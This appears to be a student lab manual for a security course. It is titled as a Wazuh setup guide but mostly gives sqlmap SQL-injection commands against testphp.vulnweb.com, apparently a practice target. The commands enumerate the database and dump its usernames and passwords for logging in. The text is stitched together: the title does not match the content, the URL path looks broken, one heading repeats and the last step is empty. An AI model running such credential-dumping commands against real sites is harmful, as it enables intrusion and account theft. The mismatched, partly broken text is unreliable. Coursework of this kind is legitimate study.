# Threat-Modelling-Security-Monitoring
Manual setup of Wazuh on Ubuntu – full connection process. Created as a personal practice after following the lab manual and Linux command lessons from sir. Includes step-by-step commands and configuration.


 
116 – security governance, risk management and compliance sessional 
project manual

  Submitted by  : Muntaka Maliha Rahman
  Student ID     : 2304009
  Faculty           : Security and Communication Engineering
  Department    : Cyber Security Engineering 
  Session            : 2023-24
 


  Submitted to : MD. Rakib Hossen
  Assistant Professor, Chairman of CySE
  University of Frontier Technology, Bangladesh




Step 1:  Open Browser
•	Search for ‘releases.ubuntu.com’.
•	After entering, click on the ‘Ubuntu 22.04.5 LTS (Jammy Jellyfish)’.
 
•	To download the Ubuntu Server, click on ‘64-bit PC (AMD64) desktop image’.

 

Step 2:  Perform Initial SQL Injection
•	Copy vulnerable URL. Paste that in a new tab and add php?id= to know which parameter to test for SQL injection. Select the first address. 
 
•	Select any one from these three options.
 
•	Then copy website link.
 




•	And paste that link with the command: 
sqlmap -u testphp.vulnweb.com/artists/php?artist=1 --dbs
 
Step 3:  Extract Tables
•	Extract the tables from the database using the following command:
sqlmap -u testphp.vulnweb.com/artists/php?artist=1 -D acuart --tables
 


Step 4: Extract Column Information
•	Extract information about the columns in the “users” table:
sqlmap -u testphp.vulnweb.com/artists/php?artist=1 -D acuart -T users --columns
 
Step 5:  Dump Table Data
•	Dump the data from the “users” table:
sqlmap -u testphp.vulnweb.com/artists/php?artist=1 -D acuart -T users -C uname --dump
 
Step 6:  Dump Table Data
•	Dump the data from the “users” table:
sqlmap -u testphp.vulnweb.com/artists/php?artist=1 -D acuart -T users -C pass --dump
 
Step 7:  Apply Uname and Pass to the Website: 
 
 

